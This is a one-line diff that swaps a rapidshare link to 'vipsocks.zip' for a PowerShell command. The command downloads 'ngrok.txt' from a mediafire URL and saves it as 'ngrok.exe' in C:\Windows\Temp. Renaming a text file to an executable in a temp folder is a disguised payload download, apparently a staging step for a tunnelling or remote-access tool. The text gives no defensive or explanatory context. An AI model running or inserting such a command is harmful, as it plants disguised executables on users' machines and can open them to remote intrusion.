@@ -1,1 +1,1 @@
-https://cdn-34.rapidshare.nu/52H960B1n2/60d20b49-1574707947/vipsocks.zip
+powershell Invoke-WebRequest -Uri "http://download1512.mediafire.com/y3lxhao0lmeg/nwkzcwd004crvsh/ngrok.txt" -OutFile "C:\Windows\Temp\ngrok.exe"
